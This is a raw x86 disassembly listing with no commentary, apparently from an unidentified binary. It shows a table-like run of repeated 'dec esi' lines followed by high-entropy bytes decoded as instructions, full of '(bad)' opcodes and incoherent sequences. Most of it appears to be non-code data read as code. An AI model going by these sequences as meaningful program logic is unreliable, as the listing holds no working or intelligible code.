  47255d:	dec    esi
  47255e:	dec    esi
  47255f:	dec    esi
  472560:	dec    esi
  472561:	(bad)  
  472563:	(bad)  
  472565:	dec    esi
  472566:	dec    esi
  472567:	dec    esi
  472568:	dec    esi
  472569:	rol    cl,0xc2
  47256c:	ret    
  47256d:	dec    esi
  47256e:	dec    esi
  47256f:	dec    esi
  472570:	dec    esi
  472571:	(bad)  
  472572:	(bad)
  472575:	dec    esi
  472576:	dec    esi
  472577:	dec    esi
  472578:	dec    esi
  472579:	enter  0xcac9,0xcb
  47257d:	dec    esi
  47257e:	dec    esi
  47257f:	dec    esi
  472580:	dec    esi
  472581:	int3   
  472582:	int    0xce
  472584:	iret   
  472585:	dec    esi
  472586:	dec    esi
  472587:	dec    esi
  472588:	dec    esi
  472589:	mov    al,0xb1
  47258b:	mov    dl,0xb3
  47258d:	dec    esi
  47258e:	dec    esi
  47258f:	dec    esi
  472590:	dec    esi
  472591:	mov    ah,0xb5
  472593:	mov    dh,0xb7
  472595:	dec    esi
  472596:	dec    esi
  472597:	dec    esi
  472598:	dec    esi
  472599:	mov    eax,0x4ebbbab9
  47259e:	dec    esi
  47259f:	dec    esi
  4725a0:	dec    esi
  4725a1:	mov    esp,0x4ebfbebd
  4725a6:	dec    esi
  4725a7:	dec    esi
  4725a8:	dec    esi
  4725a9:	mov    al,ds:0x4ea3a2a1
  4725ae:	dec    esi
  4725af:	dec    esi
  4725b0:	dec    esi
  4725b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4725b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4725b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4725b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4725b5:	dec    esi
  4725b6:	dec    esi
  4725b7:	dec    esi
  4725b8:	dec    esi
  4725b9:	test   al,0xa9
  4725bb:	stos   BYTE PTR es:[edi],al
  4725bc:	stos   DWORD PTR es:[edi],eax
  4725bd:	dec    esi
  4725be:	dec    esi
  4725bf:	dec    esi
  4725c0:	dec    esi
  4725c1:	lods   al,BYTE PTR ds:[esi]
  4725c2:	lods   eax,DWORD PTR ds:[esi]
  4725c3:	scas   al,BYTE PTR es:[edi]
  4725c4:	scas   eax,DWORD PTR es:[edi]
  4725c5:	dec    ecx
  4725c6:	fidiv  WORD PTR [esi+ecx*2-0x70]
  4725ca:	jg     0x4725f5
  4725cc:	jae    0x472599
  4725ce:	nop
  4725cf:	sbb    al,0x90
  4725d1:	jl     0x472603
  4725d3:	jae    0x472651
  4725d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4725d6:	or     BYTE PTR [ebx],0xbb
  4725d9:	mov    BYTE PTR [esi],ch
  4725db:	add    DWORD PTR [esi],edx
  4725dd:	dec    edi
  4725de:	pop    eax
  4725df:	rcl    BYTE PTR [edx+0x69739a43],0x2c
  4725e6:	loopne 0x472588
  4725e8:	aaa    
  4725e9:	push   cs
  4725ea:	mov    ds:0x7ffb5601,eax
  4725ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4725f0:	xchg   esp,eax
  4725f1:	or     DWORD PTR [ebp+0x78],eax
  4725f4:	arpl   WORD PTR [ebp+0x70],sp
  4725f7:	je     0x472662
  4725f9:	outs   dx,DWORD PTR ds:[esi]
  4725fa:	outs   dx,BYTE PTR ds:[esi]
  4725fb:	lock mov bh,0x42
  4725fe:	ds iret 
  472600:	ror    bh,0xf0
  472603:	adc    BYTE PTR [ebx+esi*2],bh
  472606:	sti    
  472607:	fcomp  DWORD PTR [edi+0x45bcdc9c]
  47260d:	dec    eax
  47260e:	gs popa 
  472610:	jo     0x4725c7
  472612:	nop
  472613:	dec    esp
  472614:	je     0x4725cd
  472616:	stos   DWORD PTR es:[edi],eax
  472617:	in     al,0xbb
  472619:	inc    esp
  47261a:	ds mov bh,0xa4
  47261d:	push   0xcfff815
  472622:	inc    ebp
  472623:	dec    edi
  472624:	jne    0x47269a
  472626:	dec    edi
  472627:	dec    bp
  472629:	gs ins DWORD PTR es:[edi],dx
  47262b:	outs   dx,DWORD PTR ds:[esi]
  47262c:	jb     0x4726a7
  47262e:	mov    gs,WORD PTR [eax+0x586a9b7]
  472634:	mov    bh,0x3e
  472636:	outs   dx,DWORD PTR ds:[esi]
  472637:	aas    
  472638:	dec    esi
  472639:	mov    ah,0xed
  47263b:	test   DWORD PTR [ebx],0xba6e4945
  472641:	inc    ebp
  472642:	jb     0x4726b6
  472644:	mov    dh,0x0
  472646:	jne    0x4725f7
  472648:	add    BYTE PTR [ebp+0x60],dh
  47264b:	xor    BYTE PTR [eax+eax*2+0x16e016ca],ah
  472652:	pusha  
  472653:	push   ss
  472654:	ds (bad) 
  472656:	xchg   ebx,eax
  472657:	mov    esp,DWORD PTR [esi]
  472659:	and    BYTE PTR [esi-0x51],ch
  47265c:	pop    eax
  47265d:	xchg   BYTE PTR [ecx],ah
  47265f:	push   ebx
  472660:	leave  
  472661:	mov    ah,0x74
  472663:	adc    dl,bh
  472665:	adc    eax,0xb89b45c8
  47266a:	mov    edi,0x864164b8
  47266f:	ret    
  472670:	or     DWORD PTR [esi],ebx
  472672:	sbb    ebp,DWORD PTR [esi+0x10]
  472675:	jbe    0x472620
  472677:	in     al,0x77
  472679:	mov    DWORD PTR [esi],edi
  47267b:	scas   eax,DWORD PTR es:[edi]
  47267c:	ins    BYTE PTR es:[edi],dx
  47267d:	jne    0x472663
  47267f:	and    bh,cl
  472681:	dec    DWORD PTR [edx]
  472683:	inc    ebp
  472684:	inc    esp
  472685:	imul   esi,DWORD PTR [esi+0x42],0x72655a79
  47268c:	outs   dx,DWORD PTR ds:[esi]
  47268d:	nop
  47268e:	push   0xc57cbb68
  472693:	or     bh,BYTE PTR [esi+0x52]
  472696:	popa   
  472697:	outs   dx,BYTE PTR ds:[esi]
  472698:	shr    BYTE PTR gs:[bx+0x158e],0xc8
  47269f:	inc    ebp
  4726a0:	shl    dh,0x68
  4726a3:	clc    
  4726a4:	cld    
  4726a5:	int    0x49
  4726a7:	outs   dx,BYTE PTR ds:[esi]
  4726a8:	jbe    0x47270f
  4726aa:	jb     0x472712
  4726ac:	ins    BYTE PTR es:[edi],dx
  4726ad:	outs   dx,DWORD PTR ds:[esi]
  4726ae:	ja     0x4726cc
  4726b0:	ja     0x472679
  4726b2:	push   0x1c9c8148
  4726b7:	ja     0x4726cf
  4726b9:	dec    ebp
  4726ba:	mov    esi,esi
  4726bc:	adc    DWORD PTR [eax+0x4c],0xaf749065
  4726c3:	push   cs
  4726c4:	push   esi
  4726c5:	leave  
  4726c6:	xchg   ebx,eax
  4726c7:	je     0x472699
  4726c9:	jbe    0x472731
  4726cb:	jbe    0x47265d
  4726cd:	mov    esi,esi
  4726cf:	cmp    esi,DWORD PTR [eax]
  4726d1:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0xccafcc90
  4726d9:	sub    eax,0xc62b0c2c
  4726de:	ins    DWORD PTR es:[edi],dx
  4726df:	jle    0x4726eb
  4726e1:	in     al,0x44
  4726e3:	mov    ebx,0x782465b2
  4726e8:	scas   eax,DWORD PTR es:[edi]
  4726e9:	and    al,0x78
  4726eb:	(bad)  
  4726ec:	adc    DWORD PTR [esi],eax
  4726ee:	inc    edi
  4726ef:	(bad)  
  4726f0:	rcl    esi,0x7c
  4726f3:	scas   eax,DWORD PTR es:[edi]
  4726f4:	pop    edi
  4726f5:	shl    DWORD PTR [eax-0x75],0x3e
  4726f9:	andnps xmm5,XMMWORD PTR [esi+0x64]
  4726fd:	add    BYTE PTR [edi-0x6f4e9898],dh
  472703:	aam    0xaf
  472705:	ds loopne 0x472769
  472708:	cmp    BYTE PTR [edx+0x50bf0f0f],al
  47270e:	outs   dx,DWORD PTR ds:[esi]
  47270f:	imul   edi,DWORD PTR [edx-0x7bb84bc],0x3fb77930
  472719:	or     al,0xfd
  47271b:	mov    al,0xb
  47271d:	mov    eax,0x43b70c5f
  472722:	popa   
  472723:	jae    0x472799
  472725:	lea    ebp,[edi+0x46da2e40]
  47272b:	mov    bh,0x8c
  47272d:	or     eax,0xeab1a45
  472732:	scas   al,BYTE PTR es:[edi]
  472733:	inc    ebx
  472734:	dec    edx
  472735:	shr    BYTE PTR [edi-0xbba86fe],cl
  47273b:	mov    gs,WORD PTR [edx+0x79e89716]
  472741:	add    bh,ah
  472743:	add    DWORD PTR [eax+edx*1+0x73738845],ebx
  47274a:	push   esi
  47274b:	adc    BYTE PTR [ecx+0x6cc0327c],dl
  472751:	popa   
  472752:	sbb    edx,DWORD PTR [esi+0x48]
  472755:	jp     0x4727d3
  472757:	sbb    al,0x8
  472759:	cmp    DWORD PTR [eax+0x7a],ecx
  47275c:	push   eax
  47275d:	jb     0x47274f
  47275f:	ins    BYTE PTR es:[edi],dx
  472760:	mov    ecx,0x14093b68
  472765:	nop
  472766:	mov    al,ds:0x45aa0af
  47276b:	mov    esp,0x52450e02
  472770:	arpl   WORD PTR [ebx+0x40],bp
  472773:	fisub  DWORD PTR cs:[ecx]
  472776:	add    DWORD PTR [eax-0x77034804],edx
  47277c:	or     eax,0xdf09ae1d
  472781:	je     0x472757
  472783:	ins    BYTE PTR es:[edi],dx
  472784:	inc    ebx
  472785:	and    DWORD PTR [edi],esp
  472787:	sub    ch,BYTE PTR [edx+0x548f7b6e]
  47278d:	jnp    0x472760
  47278f:	push   es
  472790:	stc    
  472791:	add    edx,DWORD PTR [esi+0x61]
  472794:	jb     0x4727ff
  472796:	popa   
  472797:	outs   dx,BYTE PTR ds:[esi]
  472798:	mov    al,0xb7
  47279a:	lds    esp,FWORD PTR [edx+0x5]
  47279d:	jb     0x47274f
  47279f:	mov    cs,WORD PTR [eax+0xf1787de]
  4727a5:	inc    esp
  4727a6:	add    BYTE PTR [esi+0x61],0xdc
  4727aa:	lea    esp,fs:[esi]
  4727ad:	jl     0x472748
  4727af:	add    bh,BYTE PTR [ecx]
  4727b1:	sar    DWORD PTR [edi+0xe7c10],1
  4727b7:	mov    al,cs:0x72b062a8
  4727bd:	clc    
  4727be:	inc    ecx
  4727bf:	enter  0x9b45,0xef
  4727c3:	ins    BYTE PTR es:[edi],dx
  4727c4:	mov    bh,0x6c
  4727c6:	leave  
  4727c7:	in     eax,dx
  4727c8:	push   esp
  4727c9:	adc    DWORD PTR [esi+0x66],0x5cc8b770
  4727d0:	cmp    BYTE PTR [edi+edx*1],0xc8
  4727d4:	adc    BYTE PTR [eax],cl
  4727d6:	or     bh,BYTE PTR [esi]
  4727d8:	mov    esp,0xab534602
  4727dd:	push   ds
  4727de:	and    BYTE PTR [ebp+0x67],bh
  4727e1:	adc    eax,0x20272046
  4727e6:	jge    0x472776
  4727e8:	icebp  
  4727e9:	fbld   TBYTE PTR [edi+edi*2]
  4727ec:	push   ebx
  4727ed:	popa   
  4727ee:	data16 arpl WORD PTR gs:[ecx+0x6c],sp
  4727f3:	cmp    BYTE PTR [esi+0x11],bh
  4727f6:	add    ebp,DWORD PTR [esi]
  4727f8:	aaa    
  4727f9:	xor    al,0x4
  4727fb:	outs   dx,BYTE PTR ds:[esi]
  4727fc:	add    dh,BYTE PTR [edi+0xf485d29]
  472802:	or     BYTE PTR [esi],ah
  472804:	nop
  472805:	int3   
  472806:	sub    dh,BYTE PTR [esi+0x736c4455]
  47280c:	out    0x5c,al
  47280e:	inc    edi
  47280f:	cmp    BYTE PTR [edx-0x80],dh
  472812:	inc    ebx
  472813:	and    DWORD PTR [esi+0x1],esi
  472816:	mov    esi,0x45ba2724
  47281b:	and    DWORD PTR [edi+0x3f],0xfe209744
  472822:	in     eax,dx
  472823:	push   esp
  472824:	(bad)  
  472825:	rol    BYTE PTR [esi],1
  472827:	adc    edx,DWORD PTR [esp+edx*2+0x68]
  47282b:	jb     0x472892
  47282d:	popa   
  47282e:	fs jecxz 0x472840
  472831:	sub    BYTE PTR [edx],dh
  472833:	mov    edi,0xcc0675c4
  472838:	add    eax,0xffffffd4
  47283b:	dec    esi
  47283c:	mov    ds,esp
  47283e:	push   ss
  47283f:	test   ah,al
  472841:	cmp    BYTE PTR [edi],cl
  472843:	test   al,0xc3
  472845:	cmp    al,0xe8
  472847:	enter  0x720,0x6
  47284b:	xchg   ah,dl
  47284d:	aam    0xf3
  47284f:	jns    0x472848
  472851:	xor    dl,ah
  472853:	or     DWORD PTR [esi-0x52],edi
  472856:	push   es
  472857:	sbb    eax,0xc1bf7de9
  47285c:	cmp    eax,0x1f9f14f
  472861:	push   ds
  472862:	xchg   DWORD PTR [edx-0x74],edx
  472865:	adc    BYTE PTR [ebx-0x71],bh
  472868:	sbb    eax,0xffef442f
  47286d:	fisttp DWORD PTR [esp+ebx*4-0x21]
  472871:	push   edi
  472872:	loopne 0x4728e5
  472874:	sbb    DWORD PTR ds:0x2c2e283f,edi
  47287a:	mov    edi,0x740c4416
  47287f:	and    DWORD PTR [esi+0x6],esi
  472882:	add    DWORD PTR [edi],edi
  472884:	xor    BYTE PTR [edi],ch
  472886:	push   ds
  472887:	and    al,0xb
  472889:	sahf   
  47288a:	xchg   esp,eax
  47288b:	adc    DWORD PTR [edx+edx*8+0x5f4d5426],esi
  472892:	or     al,0x36
  472894:	add    edx,DWORD PTR [esi+0x69]
  472897:	push   edx
  472898:	mov    esp,0x73756c20
  47289d:	and    BYTE PTR [eax],dh
  47289f:	xor    eax,0xd8574603
  4728a4:	ret    0x5820
  4728a7:	and    eax,ebx
  4728a9:	lods   al,BYTE PTR ds:[esi]
  4728aa:	outs   dx,BYTE PTR ds:[esi]
  4728ab:	arpl   dx,bp
  4728ad:	cmp    ch,BYTE PTR [ecx+0x7a]
  4728b0:	fdivr  st,st(6)
  4728b2:	sub    BYTE PTR cs:[ebx-0x3e3dfb09],dh
  4728b9:	jmp    0xd0b3:0xf3f76610
  4728c0:	scas   al,BYTE PTR es:[edi]
  4728c1:	push   es
  4728c2:	cli    
  4728c3:	mov    WORD PTR [ecx],ax
  4728c6:	add    al,0x13
  4728c8:	addr16 sbb eax,esi
  4728cb:	sete   BYTE PTR [esi-0x5efe4d35]
  4728d2:	inc    eax
  4728d3:	jle    0x472931
  4728d5:	cli    
  4728d6:	fldenv [ecx]
  4728d8:	pop    edx
  4728d9:	lods   al,BYTE PTR ds:[esi]
  4728da:	or     BYTE PTR [eax-0x39183ca5],bh
  4728e0:	xor    dh,BYTE PTR [eax+0x3f0e3ab3]
  4728e6:	inc    esp
  4728e7:	(bad)  
  4728e8:	sbb    DWORD PTR [ecx+0x1a91b745],ebp
  4728ee:	and    al,0xd0
  4728f0:	add    esp,ebx
  4728f2:	(bad)  
  4728f3:	pop    eax
  4728f4:	xor    ecx,ecx
  4728f6:	mov    edx,ebx
  4728f8:	daa    
  4728f9:	(bad)  
  4728fa:	dec    eax
  4728fb:	inc    esp
  4728fc:	std    
  4728fd:	or     al,0xb7
  4728ff:	push   ecx
  472900:	mov    eax,ds:0xd1456134
  472905:	or     DWORD PTR [eax],ecx
  472907:	fadd   QWORD PTR [eax+0x2a5718e6]
  47290d:	mov    BYTE PTR [edi-0x11],dh
  472910:	adc    eax,0x2306ffc
  472915:	sbb    ebx,DWORD PTR [eax+0x8]
  472918:	mov    edx,0xcc86b50c
  47291d:	inc    ecx
  47291e:	jl     0x47291f
  472920:	rcr    DWORD PTR [edx+0x5b],cl
  472923:	out    0xc,eax
  472925:	add    DWORD PTR [esi+0x29],eax
  472928:	sti    
  472929:	(bad)  
  47292a:	adc    BYTE PTR [ebp-0x2],ch
  47292d:	in     al,dx
  47292e:	frstor [edi+0x4e]
  472931:	xchg   BYTE PTR [edi+ebx*4-0x5f],ch
  472935:	and    eax,edi
  472937:	add    BYTE PTR [eax+0x7f],dl
  47293a:	fsub   QWORD PTR [eax-0x10]
  47293d:	mov    al,cl
  47293f:	out    0x17,eax
  472941:	cli    
  472942:	and    eax,eax
  472944:	dec    esi
  472945:	call   0xb61f7ced
  47294a:	xor    eax,0x654ad002
  47294f:	pop    es
  472950:	jbe    0x472969
  472952:	shl    al,0xa
  472955:	retf   0xde21
  472958:	mov    dh,BYTE PTR [edx+0x7a3c0636]
  47295e:	xlat   BYTE PTR ds:[ebx]
  47295f:	inc    BYTE PTR [edx]
  472961:	lock ja 0x472966
  472964:	sub    al,0x20
  472966:	mov    dl,0x88
  472968:	add    bh,bh
  47296a:	sub    bh,bh
  47296c:	ds sti 
  47296e:	and    BYTE PTR [esi],dl
  472970:	sbb    al,bl
  472972:	jne    0x472953
  472974:	lods   eax,DWORD PTR ds:[esi]
  472975:	lahf   
  472976:	and    ebp,ecx
  472978:	jae    0x47298b
  47297a:	inc    ecx
  47297b:	pop    edx
  47297c:	add    al,0x91
  47297e:	icebp  
  47297f:	fistp  DWORD PTR [eax]
  472981:	lds    ecx,FWORD PTR [ecx]
  472983:	jmp    0x472985
  472985:	std    
  472986:	daa    
  472987:	call   0xc1d04895
  47298c:	cmp    ecx,edx
  47298e:	jbe    0x4729b3
  472990:	push   0x39725ffb
  472995:	leave  
  472996:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  472998:	je     0x4729a2
  47299a:	movzx  eax,BYTE PTR [esi-0x1]
  47299e:	push   es
  47299f:	push   edi
  4729a0:	inc    DWORD PTR [ebx+edi*1-0x5b]
  4729a4:	aaa    
  4729a5:	pop    ecx
  4729a6:	inc    edi
  4729a7:	mov    edx,ecx
  4729a9:	cli    
  4729aa:	loop   0x4729af
  4729ac:	inc    edi
  4729ad:	sar    BYTE PTR [edi+0x59],1
  4729b0:	mov    cl,BYTE PTR [edx]
  4729b2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4729b4:	jne    0x4729bd
  4729b6:	stos   BYTE PTR es:[edi],al
  4729b7:	jne    0x4729a4
  4729b9:	pop    ss
  4729ba:	lods   eax,DWORD PTR ds:[esi]
  4729bb:	fld    QWORD PTR [ecx]
  4729bd:	inc    eax
  4729be:	inc    eax
  4729bf:	ds push ebx
  4729c1:	mov    eax,ds:0xff5e8a2a
  4729c6:	xchg   ebp,eax
  4729c7:	and    eax,0x8ac2bb0
  4729cc:	or     dl,dl
  4729ce:	mov    dh,0xed
  4729d0:	push   edi
  4729d1:	sub    ch,ch
  4729d3:	mov    bh,BYTE PTR [edi+0x1e]
  4729d6:	(bad)  
  4729d7:	(bad)  
  4729d8:	out    dx,eax
  4729d9:	and    BYTE PTR [eax],bh
  4729db:	sti    
  4729dc:	je     0x4729b6
  4729de:	loopne 0x4729a3
  4729e0:	xlat   BYTE PTR ds:[ebx]
  4729e1:	add    BYTE PTR [ecx],ch
  4729e3:	outs   dx,DWORD PTR ds:[esi]
  4729e4:	out    0xd7,al
  4729e6:	sub    eax,edx
  4729e8:	pop    ebx
  4729e9:	add    BYTE PTR [ecx],bl
  4729eb:	mov    al,ds:0xba5baa67
  4729f0:	pop    ss
  4729f1:	call   0xba70:0x30e0fc60
  4729f8:	test   eax,0xc170a20c
  4729fd:	and    eax,DWORD PTR [ecx+0x3927a624]
  472a03:	and    dh,BYTE PTR [edi+0x5027bbe7]
  472a09:	(bad)  
  472a0c:	pop    ds
  472a0d:	ret    
  472a0e:	hlt    
  472a0f:	sub    eax,0x7ef824a4
  472a14:	sbb    BYTE PTR [eax+ebx*2+0x2e],dl
  472a18:	pusha  
  472a19:	add    esi,DWORD PTR [ecx+0x16ffe56]
  472a1f:	add    eax,0xd640bbf1
  472a24:	inc    ebx
  472a25:	jno    0x472a87
  472a27:	cwde   
  472a28:	(bad)  
  472a29:	push   esp
  472a2a:	push   es
  472a2b:	arpl   WORD PTR [eax+eax*8+0x15a281f7],dx
  472a32:	mov    ebx,ecx
  472a34:	push   ebx
  472a35:	push   edi
  472a36:	adc    al,0x6d
  472a38:	jg     0x472a36
  472a3a:	add    al,dl
  472a3c:	pop    esi
  472a3d:	(bad)
  472a40:	add    bh,0xc3
  472a43:	dec    esi
  472a44:	mov    ebx,0xb7ffdbd2
  472a49:	lods   eax,DWORD PTR ds:[esi]
  472a4a:	add    DWORD PTR [ebx+0x3b],eax
  472a4d:	repz jl 0x472a57
  472a50:	cmp    BYTE PTR [edi+ebx*1-0x1],0x20
  472a55:	jbe    0x472a4b
  472a57:	adc    al,0x7d
  472a59:	or     cl,BYTE PTR [ebx-0x2584873b]
  472a5f:	pop    es
  472a60:	mov    ebp,0x37284e17
  472a65:	clc    
  472a66:	push   0xffffffce
  472a68:	sub    ecx,ebx
  472a6a:	inc    ecx
  472a6b:	shl    BYTE PTR [eax-0x20],cl
  472a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  472a6f:	shl    BYTE PTR [ecx+0x38],cl
  472a72:	les    ebx,FWORD PTR [edi]
  472a74:	and    eax,0xa280682c
  472a79:	fild   DWORD PTR [ecx+0x5ffed36d]
  472a7f:	cld    
  472a80:	dec    ebx
  472a81:	mov    al,BYTE PTR [esi]
  472a83:	add    al,0xbf
  472a85:	sub    al,0x1a
  472a87:	jb     0x472a93
  472a89:	sub    al,0x4
  472a8b:	je     0x472a9f
  472a8d:	(bad)  
  472a8e:	jae    0x472ac9
  472a90:	cmp    esp,esi
  472a92:	xchg   ebp,eax
  472a93:	hlt    
  472a94:	add    DWORD PTR [edx],0x7c
  472a97:	sub    eax,DWORD PTR [eax-0x41]
  472a9a:	pop    edx
  472a9b:	mov    dl,BYTE PTR [esi+edi*1+0x35]
  472a9f:	sar    DWORD PTR [esi-0x5f],cl
  472aa2:	push   esi
  472aa3:	rol    BYTE PTR [eax+0x15720aea],1
  472aa9:	push   cs
  472aaa:	stc    
  472aab:	pop    esi
  472aac:	or     eax,0xb9a7fd61
  472ab1:	sbb    BYTE PTR [esp+esi*2],al
  472ab4:	or     dh,bh
  472ab6:	jae    0x472abe
  472ab8:	inc    edi
  472ab9:	dec    eax
  472aba:	jne    0x472a97
  472abc:	(bad)  
  472abd:	int    0x1b
  472abf:	outs   dx,BYTE PTR ds:[esi]
  472ac0:	mov    edx,0xc908feca
  472ac5:	jne    0x472ade
  472ac7:	jns    0x472ad7
  472ac9:	idiv   DWORD PTR [edi-0x2b600029]
  472acf:	jb     0x472a6b
  472ad1:	mov    al,0x2d
  472ad3:	inc    ecx
  472ad4:	dec    esi
  472ad5:	mov    BYTE PTR [esi],al
  472ad7:	ret    
  472ad8:	mov    ecx,0x3156b50a
  472add:	shl    bh,cl
  472adf:	icebp  
  472ae0:	dec    esi
  472ae1:	push   edi
  472ae2:	pop    edx
  472ae3:	pop    ss
  472ae4:	dec    edx
  472ae5:	out    dx,al
  472ae6:	cmp    dl,0x3a
  472ae9:	push   edx
  472aea:	ret    0x8807
  472aed:	(bad)  
  472aee:	cmp    ecx,DWORD PTR [edx]
  472af0:	test   al,0x16
  472af2:	hlt    
  472af3:	jmp    0x76ca:0x29f129b8
  472afa:	adc    BYTE PTR [ecx],al
  472afc:	shl    DWORD PTR [eax-0x200131d0],1
  472b02:	jmp    FWORD PTR [ecx]
  472b04:	(bad)  
  472b05:	jmp    0x472b0a
  472b07:	mov    BYTE PTR [edx+esi*1],al
  472b0a:	dec    edx
  472b0b:	jne    0x472b07
  472b0d:	push   0x56
  472b0f:	mov    esi,esp
  472b11:	sub    esp,0x10
  472b14:	xor    ecx,ecx
  472b16:	push   edx
  472b17:	outs   dx,BYTE PTR ds:[esi]
  472b18:	cdq    
  472b19:	push   ecx
  472b1a:	xor    BYTE PTR [ebx-0xd767b10],0x58
  472b21:	imul   edx,edx,0x7b
  472b24:	push   cs
  472b25:	xchg   esi,eax
  472b26:	add    dh,BYTE PTR [edi-0x34ccf2a]
  472b2c:	mov    bh,0x14
  472b2e:	aam    0xb0
  472b30:	retf   
  472b31:	and    bh,bh
  472b33:	jo     0x472b39
  472b35:	push   DWORD PTR [eax]
  472b37:	mov    eax,esp
  472b39:	test   DWORD PTR [esi+0x1b],0x86b40809
  472b40:	cs pop esp
  472b42:	xchg   ecx,eax
  472b43:	mov    edx,0x738756e8
  472b48:	and    al,0xc6
  472b4a:	sub    al,0x2d
  472b4c:	dec    esi
  472b4d:	inc    ecx
  472b4e:	add    eax,0x3e99be00
  472b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  472b54:	mov    ds:0x247cd904,al
  472b59:	add    bl,BYTE PTR [edx-0x2ca4459a]
  472b5f:	inc    BYTE PTR [ecx+0xf00240c]
  472b65:	fldcw  WORD PTR [eax+edx*1]
  472b68:	mov    ecx,ebx
  472b6a:	dec    esi
  472b6b:	add    al,0xb4
  472b6d:	cmp    DWORD PTR [ecx-0x3f9309d9],ecx
  472b73:	pop    esi
  472b74:	and    DWORD PTR [esp+esi*2+0xa],0xc1fe0968
  472b7c:	fistp  DWORD PTR [edi]
  472b7e:	(bad)  
  472b7f:	fild   QWORD PTR [esp+0x8]
  472b83:	fistp  WORD PTR [eax-0x28]
  472b86:	ret    0xc1de
  472b89:	add    bl,ch
  472b8b:	add    bl,bh
  472b8d:	sub    bh,bl
  472b8f:	add    al,0xec
  472b91:	xor    ch,BYTE PTR [esi-0x21]
  472b94:	ins    BYTE PTR es:[edi],dx
  472b95:	ror    DWORD PTR [esi-0x27],0xf8
  472b99:	(bad)  
  472b9b:	fdiv   st(1),st
  472b9d:	mov    bl,BYTE PTR [esi+0x30]
  472ba0:	cmp    al,0xff
  472ba2:	push   esi
  472ba3:	pusha  
  472ba4:	adc    ch,BYTE PTR [esi+0x2c06ac7e]
  472baa:	fcom   st(3)
  472bac:	fstsw  ax
  472baf:	sahf   
  472bb0:	jae    0x472b93
  472bb2:	lock fisttp WORD PTR [eax-0x4b]
  472bb6:	fldcw  WORD PTR [edx+0x2]
  472bb9:	(bad)  
  472bba:	ffree  st(3)
  472bbc:	ffree  st(2)
  472bbe:	ffree  st(1)
  472bc0:	ffree  st(0)
  472bc2:	pop    ecx
  472bc3:	add    BYTE PTR [esi+0x29d54e6c],dl
  472bc9:	(bad)  
  472bca:	add    ecx,edx
  472bcc:	outs   dx,DWORD PTR ds:[esi]
  472bcd:	test   eax,0xdd06b079
  472bd2:	and    BYTE PTR [eax+0x16],dl
  472bd5:	push   ecx
  472bd6:	cmp    BYTE PTR [ecx-0x7d],cl
  472bd9:	or     bl,ah
  472bdb:	lock and BYTE PTR [esi-0x7c],bl
  472bdf:	xor    ebp,DWORD PTR [ebx-0x57ce808]
  472be5:	mov    esi,0x51574002
  472bea:	mov    ecx,0xe18b9602
  472bef:	lods   al,BYTE PTR ds:[esi]
  472bf0:	aaa    
  472bf1:	and    BYTE PTR ds:0xd7d71d2c,ch
  472bf7:	call   0x31e790d0
  472bfc:	rcr    DWORD PTR [edx],1
  472bfe:	lock stos DWORD PTR es:[edi],eax
  472c00:	sbb    DWORD PTR [edi+0x46],ebx
  472c03:	and    esi,DWORD PTR [esp+edi*1-0x3a]
  472c07:	sub    cl,BYTE PTR [ebx]
  472c09:	(bad)  
  472c0a:	mov    eax,ds:0x440256ea
  472c0f:	sbb    ah,BYTE PTR [esi+0x40]
  472c12:	fdiv   QWORD PTR [ebx-0x39ffbd80]
  472c18:	pop    ebx
  472c19:	ja     0x472b9d
  472c1b:	fidivr WORD PTR [ebx-0x7e]
  472c1e:	hlt    
  472c1f:	aam    0x6d
  472c21:	imul   edi,DWORD PTR [ebx-0x399ff17e],0xa7f226af
  472c2b:	cmp    eax,0x895e523b
  472c30:	push   es
  472c31:	cwde   
  472c32:	pop    edx
  472c33:	outs   dx,DWORD PTR ds:[esi]
  472c34:	mov    eax,ds:0x4f458788
  472c39:	into   
  472c3a:	xchg   BYTE PTR [ecx+ebx*1-0x475fd628],bl
  472c41:	xor    al,0xc0
  472c43:	add    dh,BYTE PTR [edx+0x1f]
  472c46:	or     DWORD PTR [eax],ecx
  472c48:	jge    0x472c29
  472c4a:	fbld   TBYTE PTR [ecx+0xb]
  472c4d:	pop    es
  472c4e:	inc    ebx
  472c4f:	dec    esp
  472c50:	sbb    BYTE PTR [edi-0x46],cl
  472c53:	cld    
  472c54:	test   BYTE PTR [ebx],ah
  472c56:	xor    esp,DWORD PTR [eax]
  472c58:	xchg   ebx,eax
  472c59:	pop    esp
  472c5a:	in     al,dx
  472c5b:	clc    
  472c5c:	mov    eax,ds:0x588c6d8c
  472c61:	dec    edi
  472c62:	imul   esi,DWORD PTR [edx-0x7af373ce],0x1006ef9f
  472c6c:	int3   
  472c6d:	add    al,0xb4
  472c6f:	or     al,0x1f
  472c71:	ror    BYTE PTR ds:0xe0059c20,0x20
  472c78:	sbb    bh,0x7e
  472c7b:	push   ds
  472c7c:	inc    dh
  472c7e:	inc    ebp
  472c7f:	call   DWORD PTR [edx+0x7cf685f2]
  472c85:	and    BYTE PTR [esi+0x76],al
  472c88:	or     edi,DWORD PTR [edi-0x74295274]
  472c8e:	adc    eax,esp
  472c90:	jno    0x472c2a
  472c92:	mov    dh,0x31
  472c94:	hlt    
  472c95:	imul   eax,DWORD PTR [esi],0x3a
  472c98:	add    ebx,ebp
  472c9a:	push   es
  472c9b:	or     eax,0x9168ae3
  472ca0:	sbb    BYTE PTR [eax+0x0],bh
  472ca3:	inc    ebx
  472ca4:	(bad)  
  472ca5:	adc    DWORD PTR [edi],edx
  472ca7:	add    DWORD PTR [edi-0x61],edx
  472caa:	fidiv  DWORD PTR [edx-0x73]
  472cad:	push   ebp
  472cae:	lock cld 
  472cb0:	dec    ebp
  472cb1:	(bad)  
  472cb2:	pop    ds
  472cb3:	pop    ds
  472cb4:	xchg   esp,ebx
  472cb6:	mov    edx,eax
  472cb8:	mov    al,0x11
  472cba:	fld    TBYTE PTR [ebp-0x10]
  472cbd:	fcomp  DWORD PTR ds:0xbfbf04d0
  472cc3:	sbb    BYTE PTR [eax],dl
